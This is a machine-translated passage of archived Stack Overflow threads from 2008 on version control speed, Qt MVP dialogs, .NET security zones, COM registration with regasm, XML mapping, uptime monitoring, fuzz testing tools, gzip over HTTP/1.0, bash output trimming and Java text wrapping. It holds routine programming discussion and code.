我在这方面取得的成功非常有限，这也是我们仍然使用源代码安全的原因之一。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-10-27T11:16:36.807

Visual SourceSafe 建立在文件共享之上。因此，当您在文件中预订时，一切都是使用文件系统完成的。因此，在访问 vss 服务器时，VSS 不仅可以将文件文本发送到服务器，而且远程发生的所有事情都会从磁盘访问物理块。包括在共享磁盘目录中查找文件等...这比客户端服务器定制协议慢大约 10 倍。

有一个名为 SourceOffSite 的产品，它为 VSS 数据库添加了一个更快的前端，这使得 VSS 在较慢的链接上可用。

托尼

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-10-27T10:08:23.263

根据我的经验，它会快得多。

我没有在 VSS 和 SVN 中使用过相同的大型项目，但我在每个项目中都做了不同的项目，并将一个较小的项目从 VSS 迁移到 SVN。

有些事情要快得多。特别是，签入/提交大量文件会产生一条警告消息，类似于“这将花费很长时间并且可能实际上不起作用？您是否仍要尝试这样做？” （这并不完全是它所说的）。

在 VSS 中实际上不可能提交大量更改 - 您必须进行多次小提交，使项目处于暂时中断的状态（尽管它无论如何都没有原子提交，所以无论如何都会发生这种情况） .

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-10-27T10:05:40.617

我同意@relentless 关于颠覆的观点，但我更喜欢使用命令行。这需要一点时间来学习，但一旦你学会了，你会更快。

此外，如果性能是一个重要问题，您可能想看看[http://git.or.cz/](http://git.or.cz/)，据称它非常快速且可靠。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-10-27T10:30:52.890

TortoiseSVN 确实是一个非常好的客户端，我将它与服务器上的[Trac](http://trac.edgewall.org/)结合使用，以对存储库和一个不错的 wiki/ticket 系统进行 Web 访问。

LiveCD[链接](http://buildix.thoughtworks.com/)。

# c++ - 为“Humble Dialogs”创建视图的方法

> ID：239453
> 
> 赞同：4
> 
> 时间：2008-10-27T09:50:10.307
> 
> 标签：c++, unit-testing, user-interface, qt

关于在创建 GUI 时将视图与逻辑分离的问题，我有很多问题要发布。
以下是我将使用“Humble Dialog”方法为具有标签和按钮的简单对话框执行的操作的最小示例。按下按钮应在标签上显示一些文本。我使用了 C++ 和我熟悉的 Qt，但我想所有其他观众都可以阅读它。
无论如何，由于语言的选择，我对可能的副作用感兴趣（我在项目中使用 C++，我有兴趣介绍这一点）。

```
class IView {
public:
    IView(){}
    virtual ~IView(){}

    virtual void showResult(const QString &text)=0;
};

class Presenter {
public:
    Presenter(IView *view){
        m_View = view;
    }
    ~Presenter(){}

    void buttonPressed(){
        QString text;
        // Evaluate text
        m_View->showResult(text);        
    }

private:
    IView *m_View;
}

// Multiple inheritance. Is this OK?
class MyView : public QDialog, public IView {
public:
    MyView(){
        m_Presenter = new Presenter(this);
        m_Button = new QPushbutton(this);
        m_Label = new QLabel(this);

        // Ui event handled inside view but then directly
        // propagated to the Presenter
        connect(m_Button,SIGNAL(clicked()),this,SLOT(buttonPressed()));
    }
    ~MyView(){
        delete m_Presenter;
        // Qt will automatically delete m_Button and m_Label;
    }

    void showResult(const QString &text){
        m_Label->setText(text);
    }

protected slots:
    void buttonPressed(){
        m_Presenter->buttonPressed();
    }

private:
    Presenter *m_Presenter;
    QPushbutton *m_Button;
    QLabel *m_Label;
}

class TestView : public IView {
public:
    TestView(){}
    ~TestView(){}

    void showResult(const QString &text){
        m_LabelText = text;
    }
    QString getResult(){
        return m_LabelText;
    }

private:
    QString m_LabelText;
}

// Test code
TestView view;
Presenter presenter(&view);
presenter.buttonPressed();
EXPECT_EQ(view.getResult(),"Expected Result");

// Procuction code
MyView view;
view.show(); 
```

现在，这就是我按照[Feathers 对 Humble 对话框的初步工作](http://www.objectmentor.com/resources/articles/TheHumbleDialogBox.pdf)得到的结果。我从[Fowler 的实现](http://codebetter.com/blogs/jeremy.miller/pages/129546.aspx)中得到的方法是避免在 MyView 的构造函数中创建 Presenter 类的实例，而是将其作为参数传递，这样生产代码就会看起来像测试代码。我个人喜欢我在这里介绍的方法。

所以，

*   它是否意味着与多重继承一起使用（请参阅我在 MyView 类中的评论）？
*   事件应该直接传播到 Presenter 还是应该在将调用相应 Presenter 操作的视图中处理（正如我在此处所做的那样，以避免必须将 Presenter 设为 QObject 以便它可以处理 UI 事件）？
*   有没有其他说明？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-11-01T05:48:04.743

当您使用 QObjects 进行多重继承时，继承列表中的第一个类需要是 QObject 派生类。仅当您计划在类中添加信号和插槽时，才严格要求这样做，但无论如何都是很好的做法。所以你的班级声明：

类 MyView ：公共 IView ，公共 QDialog {

需要改为：

类MyView：公共QDialog，公共IView {

同样，这只会在您向“MyView”添加插槽或信号时才会对您不利。

除此之外，我认为这是一个很好的实现，尽管对于对话来说有大量的矫枉过正。:)

我将 Fowler 的 MVP 与 Qt 一起使用，它工作正常。事情更具可测试性（nUnit 风格），但 IMO 有点复杂。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-27T10:45:53.377

我通常在 C# Winforms 中为我的 UI 使用相同的模式。

您实际上并没有真正在这里进行多重继承。您继承的其中一个类只是一个空接口。这里唯一的问题是 C++ 不知道类和接口之间的区别。

我认为在这样的视图中创建演示者也没有问题。这不是最可测试的设计，但您可能无论如何都不会测试视图，因为如果您使用的是简陋的对话框，那里没有什么可以测试的。或者，您可以通过添加第二个构造函数来注入演示者，而不是出于测试目的创建演示者，从而执行“穷人的 DI”。

在 C# 中，我通常有根本不了解演示者的视图，只是抛出事件而不是调用演示者。这增加了一些解耦，但在大多数情况下可能是矫枉过正。

总的来说，这是一个很好的实现。如果我必须编写带有 UI 的 C++ 应用程序，我将查看这篇文章

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-27T11:38:10.383

对我来说看起来不错。但我不会在 IView-Interface 中使用 QString。如果可能，请使用一些与演示无关的类型。这样，您可以更改 GUI 工具包，而不会影响程序逻辑和测试。只有在 QString 和 std::string 或 char* 之间转换真的很痛苦时才保留 QString （我不知道......）。

# c# - 获取 .NET 应用程序的当前/活动安全区域？

> ID：239463
> 
> 赞同：6
> 
> 时间：2008-10-27T09:57:29.340
> 
> 标签：c#, .net, security, cas, security-zone

我有一个行为奇怪的应用程序，只是为了验证，我想看看它当前在哪个安全区域下运行。

我找到了 System.Security.SecurityZone 枚举，但似乎找不到任何可以返回我正在运行的这些枚举的东西。

有没有人有任何提示？

基本上我想知道我的应用程序是否在 MyComputer、Intranet、Internet、Untrusted、Trusted 等中运行。

* * *

**编辑：**感谢[@blowdart](https://stackoverflow.com/users/2525/blowdart) ，这是我为查找此代码而编写的次要测试应用程序。

```
using System;
using System.Reflection;

namespace zone_check
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine(".NET version: " + Environment.Version);
            foreach (Object ev in Assembly.GetExecutingAssembly().Evidence)
            {
                if (ev is System.Security.Policy.Zone)
                {
                    System.Security.Policy.Zone zone = (System.Security.Policy.Zone)ev;
                    Console.WriteLine("Security zone: " + zone.SecurityZone);
                    break;
                }
            }
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-10-27T10:04:23.100

您需要查看当前程序集的 CAS 证据；

this.GetType().Assembly.Evidence

[Assembly.Evidence](http://msdn.microsoft.com/en-us/library/system.reflection.assembly.evidence.aspx)是一个属性[Evidence](http://msdn.microsoft.com/en-us/library/system.security.policy.evidence.aspx)对象。从中您可以[枚举证据](http://www.improve.dk/blog/2008/06/11/analyzing-assembly-evidence)并查找显示为 <System.Security.Policy.Zone> 元素的区域。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-10-06T05:17:16.987

在 .NET 3.5 中，您可以使用 LINQ 简化代码：

```
Zone z = a.Evidence.OfType<Zone>().First(); 
```

从 .NET 4.0 你有一个方便的`GetHostEvidence`方法：

```
Zone z = Assembly.GetExecutingAssembly().Evidence.GetHostEvidence<Zone>(); 
```

请注意，来自 .NET 4.0 的证据类派生自`EvidenceBase`基类。

HTH, 捷尔吉

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2012-11-23T16:00:38.777

你也可以使用

```
Evidence e = Thread.CurrentThread.GetType().Assembly.Evidence; 
```

代替

```
this.GetType().Assembly.Evidence 
```

# visual-studio-2008 - 如何从 Visual Studio 2008 安装项目中使用 regasm 注册 .NET CCW

> ID：239465
> 
> 赞同：6
> 
> 时间：2008-10-27T09:58:26.530
> 
> 标签：visual-studio-2008, installation, registration, ccw

我有一个 .NET 服务应用程序的安装项目，它使用一个 .NET 组件，该组件公开一个 COM 接口（COM 可调用包装器/CCW）。为了让组件在目标机器上工作，它必须注册到

> regasm.exe /tlb /codebase component.dll

在这种情况下，生成类型库的 /tlb 开关是必需的，否则我无法从该程序集创建对象。

问题是，如何配置我的 Visual Studio 2008 Setup-Project 以通过调用 regasm /tlb 来注册此程序集？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2009-12-10T19:49:56.500

您可以改用 System.Runtime.InteropServices.RegistrationServices 来丢失对 regasm.exe 的手动调用：

```
[System.Security.Permissions.SecurityPermission(System.Security.Permissions.SecurityAction.Demand)]
public override void Install(IDictionary stateSaver)
{
base.Install(stateSaver);

RegistrationServices regsrv = new RegistrationServices();
if (!regsrv.RegisterAssembly(GetType().Assembly, AssemblyRegistrationFlags.SetCodeBase))
{
    throw new InstallException("Failed to register for COM Interop.");
}

}

[System.Security.Permissions.SecurityPermission(System.Security.Permissions.SecurityAction.Demand)]
public override void Uninstall(IDictionary savedState)
{
base.Uninstall(savedState);

RegistrationServices regsrv = new RegistrationServices();
if (!regsrv.UnregisterAssembly(GetType().Assembly))
{
    throw new InstallException("Failed to unregister for COM Interop.");
}
} 
```

这也会在卸载时取消注册库。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-01-15T12:12:27.220

1.  在您的主项目（包含您要注册的类的项目）中，右键单击项目文件并选择 Add / New Item 并选择 Installer Class。称它为 clsRegisterDll.cs
2.  在出现的设计器中，单击“单击此处切换到代码视图”或右键单击解决方案资源管理器中的 clsRegisterDll.cs 文件并选择查看代码
3.  覆盖安装、提交和卸载方法，添加：

    // 获取 regasm 字符串的位置 regasmPath = System.Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory() + @"regasm.exe"; // 获取我们的 DLL 字符串的位置 componentPath = typeof(RegisterAssembly).Assembly.Location; // 执行 regasm
    System.Diagnostics.Process.Start(regasmPath, "/codebase /tlb \"" + componentPath + "\"");

    在卸载操作中将 /codebase /tlb 替换为 /u。

4.  编译你的项目
5.  在您的安装程序中，确保您已将 dll 添加到应用程序文件夹，然后右键单击安装程序项目并选择查看/自定义操作
6.  右键单击安装，然后单击添加自定义操作
7.  双击应用程序文件夹，然后单击您的 dll
8.  对 Commit 操作执行相同操作
9.  构建和测试您的安装程序

可以在以下位置找到带有实际课程的演练供您尝试：http: [//leon.mvps.org/DotNet/RegasmInstaller.html](http://leon.mvps.org/DotNet/RegasmInstaller.html)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-27T11:45:51.913

您的服务应该有一个 Installer 类。注册到 OnAfterInstall 事件并调用 RegAsm：应该从 Windows 目录计算路径并绑定到特定的 .Net 版本。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2011-08-25T12:01:09.110

我最初尝试从安装程序进程运行 regasm（在我看到这个帖子之前）。尝试运行 regasm 并处理所有错误是有问题的 - 即使没有尝试处理 Windows 7 的提升权限。

使用`Runtime.InteropServices.RegistrationServices.RegisterAssembly`更干净，并提供了更好的错误捕获。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-06-29T15:27:23.077

默认情况下，Visual Studio 安装程序只进行 COM 类注册，但不进行类型库生成和注册（这是`/tlb`switch at `regasm.exe does`）。至少在 Visual Studio 2017 中，在要使用`Tlbexp.exe`实用程序注册的 DLL 的后期构建步骤中生成类型库就足够了。

`.tlb`如果安装程序项目在同一目录中发现与您正在安装的库具有相同扩展名的文件，它会自动将其包含到安装项目中，并在安装过程中进行注册步骤。当然，也可以`.tlb`手动生成文件并将其包含在安装项目中（并将其 Register 属性设置为`vsdrfCOM`）。

这是[一篇](https://www.red-gate.com/simple-talk/dotnet/visual-studio/build-and-deploy-a-.net-com-assembly/)关于 C# 和 COM 接口的精彩文章，上面的信息来自其名为 Deployment 的部分。

# model-view-controller - MVC 应用程序中的控制器模式

> ID：239468
> 
> 赞同：0
> 
> 时间：2008-10-27T10:03:28.140
> 
> 标签：model-view-controller, design-patterns

你最喜欢编写控制器的模式是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-27T10:21:19.230

这是一个相当棘手的问题，因为 MVC 在不同的上下文中的应用方式不同。例如，对于桌面 GUI，您可能有视图更改事件通知的侦听器，但这种行为通常不用于 Web 表单（AJAX 正在改变这一点）。

对于 Web，您通常具有：

*   模型：业务逻辑
*   视图：表示逻辑
*   控制器：应用程序逻辑

控制器通常应该是简约的，如果您发现自己在其中推送显示信息或业务规则，则可能某处存在设计缺陷。控制器中此类缺陷的经典示例是构建 HTML（视图）或直接访问数据库（模型）。

我已经[在我的 O'Reilly 博客上对 MVC 进行了更全面的描述](http://www.oreillynet.com/onlamp/blog/2007/06/what_is_mvc.html)。我在那里有具体的例子可以帮助更深入地解释事情。

# asp.net - ASP.NET 页面的动态编译？

> ID：239469
> 
> 赞同：0
> 
> 时间：2008-10-27T10:03:34.553
> 
> 标签：asp.net

我怎样才能做到这一点？我正在尝试从数据库中加载内容并将其与 Content 控件融合在一起。该程序是一些内容具有动态位，因此希望它能够即时编译。以前有人做过这种事情吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-27T11:42:58.127

不太确定您在这里真正需要做什么？

如果内容是动态的，则在运行时根据数据为其生成控件。如果你需要提高性能，为什么不缓存页面输出呢？

AFAIK 根据您似乎在做什么，动态编译不会有真正的好处。

试试这些链接：

*   [如何：使用 Visual Basic .NET 在 ASP.NET 中动态创建控件](http://support.microsoft.com/kb/317515)- 显然是 VB，但移植到 C# 应该没什么大不了的。
*   [ASP.NET 2.0 中的输出缓存](http://aspnet.4guysfromrolla.com/articles/121306-1.aspx)

# c# - 将一个 XML 文档转换为另一个 XML 文档

> ID：239486
> 
> 赞同：4
> 
> 时间：2008-10-27T10:13:27.700
> 
> 标签：c#, xml, linq, .net-3.5

我想将一个节点内包含许多元素（大约 150 个）的 XML 文档转换为另一个架构略有不同但大部分元素名称相同的 XML 文档。现在我必须手动映射两个文档之间的每个元素/节点。为此，我必须对 150 行映射和元素名称进行硬编码。像这样的东西：

```
XElement newOrder = new XElement("Order");
newOrder.Add(new XElement("OrderId", (string)oldOrder.Element("OrderId")),
newOrder.Add(new XElement("OrderName", (string)oldOrder.Element("OrderName")),
...............
...............
...............and so on 
```

newOrder 文档可能包含其他节点，如果在 oldOrder 中没有找到它们，这些节点将被设置为 null。那么，除了硬编码 150 个元素名称（如 orderId、orderName 等）之外，我还有其他选择吗……还是有更好的更易于维护的方法？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2008-10-27T10:30:20.223

请改用[XSLT 转换](http://www.w3schools.com/xsl/xsl_transformation.asp)。您可以使用内置的 .NET [XslCompiledTransform](http://msdn.microsoft.com/en-us/library/system.xml.xsl.xslcompiledtransform.aspx)进行转换。使您不必键入大量代码。如果您还不了解 XSL/XSLT，那么学习它会为您提供简历 :)

祝你好运！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-27T10:31:13.327

使用 XSLT 转换将旧的 xml 文档转换为新格式。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-27T14:07:48.180

XElement.Add 有一个采用 object[] 的[重载](http://msdn.microsoft.com/en-us/library/bb345077.aspx)。

```
List<string> elementNames = GetElementNames();

newOrder.Add(
  elementNames
    .Select(name => GetElement(name, oldOrder))
    .Where(element => element != null)
    .ToArray()
  ); 
```

//

```
public XElement GetElement(string name, XElement source)
{
  XElement result = null;
  XElement original = source.Elements(name).FirstOrDefault();
  if (original != null)
  {
    result = new XElement(name, (string)original)
  }
  return result;
} 
```

# web-applications - 推荐一个自动 Web 应用程序可用性检查器

> ID：239494
> 
> 赞同：1
> 
> 时间：2008-10-27T10:17:29.890
> 
> 标签：web-applications, automation, website-monitoring

我正在寻找一款可以安排来检查我们的网络应用程序是否已启动并正在运行的软件。几年前我使用过 HP open view，但请记住它非常昂贵，我正在寻找开源或便宜的东西。

所以它会登录并执行一些简单的操作，可能会提交表单并检查屏幕上的一些文本，这意味着 Web 应用程序运行正常，然后如果网站关闭，请给我发电子邮件。

我可以使用 Selenium IDE 创建一个测试，并使用 Ant 脚本将其自动化，但要寻找一个非编程人员可以使用的更简化的解决方案。

有什么建议么？

谢谢，斯科蒂

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-27T11:25:34.763

对于 ASP.Net 应用程序，.Net 2.0 引入了增强的运行状况[监控](http://msdn.microsoft.com/en-us/library/ms998306.aspx)来做你想做的事，以及处理各种各样的应用程序事件。它可以记录到数据库、事件日志或其他日志中，并且可以执行通知，例如发送电子邮件。

我意识到您可能不是在谈论 ASP.Net 应用程序。我只是为其他可能正在使用（或考虑）该平台的阅读此问题的人添加此回复。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2011-05-04T15:03:23.673

决定在site24x7上登录并有一个rest api可以调用以获取统计信息[-site24x7.com/index.html](http://site24x7.com/index.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-27T10:21:27.497

您可以使用 cron 来执行测试。Cron 将在指定的时间后运行测试，例如每小时一次。

Cron 在 Linux 中可用，但您可以下载 Windows 替代方案。或者您可以使用 Windows 的任务调度程序。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-27T10:26:54.850

像[mon.itor.us](http://mon.itor.us/)这样的东西会做吗？

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-27T11:47:14.890

听起来 Nagios 就是您要找的东西：

[http://www.nagios.org/](http://www.nagios.org/)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-27T14:31:44.263

我不相信他们可以进行实际登录，但他们可以检查内容等，我之前使用过 Pingdom.com 并取得了很好的成功。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2014-02-08T21:17:28.910

你找到合适的工具了吗？我们已经使用“htmlunit”库自行构建！考虑基于此类库构建自己的工具。

# windows - Windows 应用程序的猴子测试软件

> ID：239496
> 
> 赞同：6
> 
> 时间：2008-10-27T10:18:08.720
> 
> 标签：windows, testing, monkey-testing

我想通过向它发送大量随机击键来对 win32 应用程序进行压力测试，我想知道是否有人可以指出我可以使用的一些软件。理想情况下，我应该能够指定可以发送哪些击键，以及控制率（随机最小/最大）。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-12-10T07:27:24.747

Have a look at the [Fuzz Testing of Application Reliability](http://pages.cs.wisc.edu/~bart/fuzz/) website of the University of Wisconsin. They did a research study some years ago to test the reliability of desktop software and on that page you find a link to their FTP site providing fuzz testing tools.

I've used the fuzz-nt tool from that site for my own tests and successfully found several bugs in our application. It has no option to choose the keyboard input values (but source is provided). Instead it lets you choose from these sources of random data:

*   random keyboard events
*   random mouse events
*   random windows events (to be used with care or better not at all)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-10-27T10:46:26.323

看看 AutoIt。它有一个 COM 接口，因此您可以使用任何支持 COM 的语言编写脚本。我编写了 Python 脚本来自动化 GUI。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-27T14:30:31.690

我会使用宏软件，如 jrbushell 所说的 AutoIt 或 AutoHotkey。它们还允许随机点击... :-) 两者都是免费的。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-27T10:26:42.900

这是一个伪代码（因为你没有提到你正在使用的语言）：

*   创建一个数组，其中包含从 az、AZ、0-9 开始的字母表（取决于您要发送的键）
*   对于 i = 0 到 NumberOfKeyStrokes
*   rand() % SizeOfArray
*   rand() 毫秒的延迟（范围越小，击键越快）
*   通过 API 或作为字符串发送

有关向 Windows 上的应用程序发送按键的更多信息，请研究 API FindWindow 和 SendMessage

# image - 从 HTA 文件拖放图像

> ID：239498
> 
> 赞同：1
> 
> 时间：2008-10-27T10:19:45.863
> 
> 标签：image, hta

例如，从 HTML 应用程序 ( `.hta file`) 中，您可以将任何图像拖放到桌面上。

有人知道如何禁用此功能吗？

我希望`.hta`文件具有与文件相同的行为`.html`。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-27T10:35:23.567

您可以向图像添加`ondragstart="return false;"`事件处理程序，看看是否有帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2010-06-21T20:30:43.873

任何将您的 HTA 文件重命名为 HTML 文件的人都可以保存图像。

# http - http/1.0 和放气/gzip

> ID：239512
> 
> 赞同：3
> 
> 时间：2008-10-27T10:29:22.910
> 
> 标签：http, deflate

http/1.0 是否能够处理压缩和 gzip 内容？我已经完成了在我的极简网络服务器中实现 deflate 和 gzip，我真的不知道带有 http/1.0 的浏览器是否能够处理 deflate 和 gzip 压缩内容。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-10-27T10:36:24.423

好吧，这真的取决于浏览器。不是协议（HTTP 1.0 确实很高兴地允许压缩）

您应该检查[Accept-Encoding](http://www.w3.org/Protocols/HTTP/1.0/draft-ietf-http-spec.html#Accept-Encoding)标头，它可以是 gzip，也可以是 deflate。如果标题不存在，则不要压缩。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-10-27T14:38:50.487

似乎对什么`deflate`意思有不同的解释。HTTP 1.1 指定[RFC 1950](http://www.faqs.org/rfcs/rfc1950.html) (zlib) 格式，但 IIS 会生成原始[Deflate](http://www.faqs.org/rfcs/rfc1951.html)流。Internet Explorer 无法处理 RFC 1950 流 - 它会将`deflate`Content-Encoding 解释为 RFC 1951 - 因此您可能希望完全避免使用该格式。

.NET`DeflateStream` *只*实现 Deflate 压缩算法，它不创建 Zlib 格式。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-27T10:34:41.073

查看[这个相当广泛的列表](http://www.computec.ch/projekte/browserrecon/scan/accept-encoding.fdb)。（简短的回答似乎是：是的，他们这样做）。

# asp.net - ASP.AJAX TabContainer/TabPanel 自定义

> ID：239522
> 
> 赞同：3
> 
> 时间：2008-10-27T10:35:08.717
> 
> 标签：asp.net, tabcontainer

是否可以使用 AjaxToolkit 将选项卡的位置设置为选项卡容器的底部？您确实对 CSS 有一定的控制权，但我对 CSS 还不够了解，看它是否可行？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-30T15:43:27.297

您不能使用此控件的现成版本，但您可以轻松修改源代码以创建您自己的版本。检查 AjaxControlToolkit\Tabs\TabContainer.cs（如下）。您需要颠倒顺序，以便 RenderHeader() 部分位于 RenderChildren() 部分下方。或者，您可以向控件添加一个名为“RenderHeaderFirst”的属性或类似的东西来实现相同的功能：

```
 protected override void RenderContents(HtmlTextWriter writer)
    {
        Page.VerifyRenderingInServerForm(this);

        // rendering the tabs (header)
        writer.AddAttribute(HtmlTextWriterAttribute.Id, ClientID + "_header");
        writer.RenderBeginTag(HtmlTextWriterTag.Div);
        {
            RenderHeader(writer);
        }
        writer.RenderEndTag();

        // rendering the contents of the tabs (children)
        if (!Height.IsEmpty)
            writer.AddStyleAttribute(HtmlTextWriterStyle.Height, Height.ToString());

        writer.AddAttribute(HtmlTextWriterAttribute.Id, ClientID + "_body");
        writer.RenderBeginTag(HtmlTextWriterTag.Div);
        {
            RenderChildren(writer);
        }
        writer.RenderEndTag();
    } 
```

PS我自己没有尝试过，但它看起来是正确的方向。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-10-16T15:33:17.003

或者您可以只使用TabContainer的**TabStripPlacement属性...**

**TabContainer 属性**

*   **ActiveTabChanged (Event)** - 在回发后更改选项卡时在服务器端触发
*   **OnClientActiveTabChanged** - 附加到客户端 tabChanged 事件的 javascript 函数的名称
*   **CssClass** - 用于定义选项卡的自定义外观的 css 类覆盖。有关更多详细信息，请参阅选项卡主题部分。
*   **ActiveTabIndex** - 要显示的第一个选项卡
*   **高度**- 设置选项卡主体的高度（不包括 TabPanel 标题）
*   **宽度**- 设置选项卡主体的宽度
*   **ScrollBars** - 是否在 TabContainer 的主体中显示滚动条（None、Horizo​​ntal、Vertical、Both、Auto）
*   **TabStripPlacement** - 是否在容器顶部或下方（顶部、底部）呈现选项卡

# linux - 在 BASH 中截断输出

> ID：239526
> 
> 赞同：8
> 
> 时间：2008-10-27T10:35:43.553
> 
> 标签：linux, bash

如何在 BASH 中截断输出？

例如，如果我“du file.name”如何获取数值，仅此而已？

后来补充：
所有解决方案都可以完美运行。我选择接受最有启发性的“剪切”答案，因为我更喜欢其他人应该能够阅读的 bash 文件中最简单的方法。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2008-10-27T10:39:00.253

如果您知道分隔符是什么，那么 cut 就是您的朋友

```
du | cut -f1 
```

Cut 默认为制表符分隔符，因此在这种情况下，您将选择第一个字段。

您可以更改分隔符： cut -d ' ' 将使用空格作为分隔符。（来自[托马拉克](https://stackoverflow.com/users/18771/tomalak)）

您还可以选择单个字符位置或范围：

```
ls | cut -c1-2 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2008-10-27T10:40:52.793

正如其他人所说，我建议削减。但有时有用的另一种替代方法是使用 awk，因为它允许任何空格作为分隔符：

```
du file.name | awk '{print $1}' 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2008-10-27T10:38:37.213

```
du | cut -f 1 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-27T12:59:39.987

如果您只需要单个文件的字节数，请使用`-s`运算符。

```
SIZE=-s file.name 
```

这给你一个不同的数字`du`，但我不确定你是如何使用它的。

这样做的好处是不必运行`du`，并且`bash`可以直接获取文件的大小。

很难在真空中回答这样的问题，因为我们不知道您将如何使用这些数据。知道这可能会提出一个完全不同的答案。

# java - 如何使用图形在多行上输出字符串

> ID：239537
> 
> 赞同：11
> 
> 时间：2008-10-27T10:42:30.467
> 
> 标签：java, string, graphics

我的程序覆盖`public void paint(Graphics g, int x, int y);`以使用`g.drawString(someString, x+10, y+30);`

现在 someString 可能很长，因此它可能不适合一行。

在多行上写文本的最佳方法是什么。
例如，在一个矩形 (x1, y1, x2, y2) 中？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2008-10-27T12:44:33.527

多亏了 Epaga 的提示和网上的几个例子（不是很明显找到！我主要使用[Break a Line 进行文本布局](http://www.roseindia.net/java/example/java/swing/graphics2D/line-break-text-layout.shtml "文本布局换行")），我可以制作一个组件来显示包装的文本。它是不完整的，但至少它显示了预期的效果。

```
class TextContainer extends JPanel
{
    private int m_width;
    private int m_height;
    private String m_text;
    private AttributedCharacterIterator m_iterator;
    private int m_start;
    private int m_end;

    public TextContainer(String text, int width, int height)
    {
        m_text = text;
        m_width = width;
        m_height = height;

        AttributedString styledText = new AttributedString(text);
        m_iterator = styledText.getIterator();
        m_start = m_iterator.getBeginIndex();
        m_end = m_iterator.getEndIndex();
    }

    public String getText()
    {
        return m_text;
    }

    public Dimension getPreferredSize()
    {
        return new Dimension(m_width, m_height);
    }

    public void paint(Graphics g)
    {
        super.paintComponent(g);

        Graphics2D g2 = (Graphics2D) g;
        FontRenderContext frc = g2.getFontRenderContext();

        LineBreakMeasurer measurer = new LineBreakMeasurer(m_iterator, frc);
        measurer.setPosition(m_start);

        float x = 0, y = 0;
        while (measurer.getPosition() < m_end)
        {
            TextLayout layout = measurer.nextLayout(m_width);

            y += layout.getAscent();
            float dx = layout.isLeftToRight() ?
                    0 : m_width - layout.getAdvance();

            layout.draw(g2, x + dx, y);
            y += layout.getDescent() + layout.getLeading();
        }
    }
} 
```

只是为了好玩，我让它适合一个圆圈（唉，似乎没有理由）：

```
public void paint(Graphics g)
{
    super.paintComponent(g);

    Graphics2D g2 = (Graphics2D) g;
    FontRenderContext frc = g2.getFontRenderContext();

    LineBreakMeasurer measurer = new LineBreakMeasurer(m_iterator, frc);
    measurer.setPosition(m_start);

    float y = 0;
    while (measurer.getPosition() < m_end)
    {
        double ix = Math.sqrt((m_width / 2 - y) * y);
        float x = m_width / 2.0F - (float) ix;
        int width = (int) ix * 2;

        TextLayout layout = measurer.nextLayout(width);

        y += layout.getAscent();
        float dx = layout.isLeftToRight() ?
                0 : width - layout.getAdvance();

        layout.draw(g2, x + dx, y);
        y += layout.getDescent() + layout.getLeading();
    }
} 
```

不过，我不太确定 dx 计算。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-27T10:44:59.930

[java.awt.font.TextLayout](http://java.sun.com/j2se/1.4.2/docs/api/java/awt/font/TextLayout.html)可能会有所帮助。这是他们的示例代码片段：

```
 Graphics2D g = ...;
   Point2D loc = ...;
   Font font = Font.getFont("Helvetica-bold-italic");
   FontRenderContext frc = g.getFontRenderContext();
   TextLayout layout = new TextLayout("This is a string", font, frc);
   layout.draw(g, (float)loc.getX(), (float)loc.getY());

   Rectangle2D bounds = layout.getBounds();
   bounds.setRect(bounds.getX()+loc.getX(),
                  bounds.getY()+loc.getY(),
                  bounds.getWidth(),
                  bounds.getHeight());
   g.draw(bounds); 
```

否则，您总是可以使用 Swing 文本元素为您完成这项工作，只需传入您希望它绘制的图形即可。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-27T11:26:22.437

使用 Epaga 的方法逐步构建您的字符串，一次一个单词，以查找您的字符串的长度。一旦长度比您的矩形长，删除最后一个单词并打印。重复，直到你用完单词。

这听起来像是一个糟糕的算法，但对于每一行，它实际上是 O(screenWidth/averageCharacterWidth) => O(1)。

不过，使用 StringBuffer 来构建您的字符串！

* * *

## 回答 #4

> 赞同：1
> 
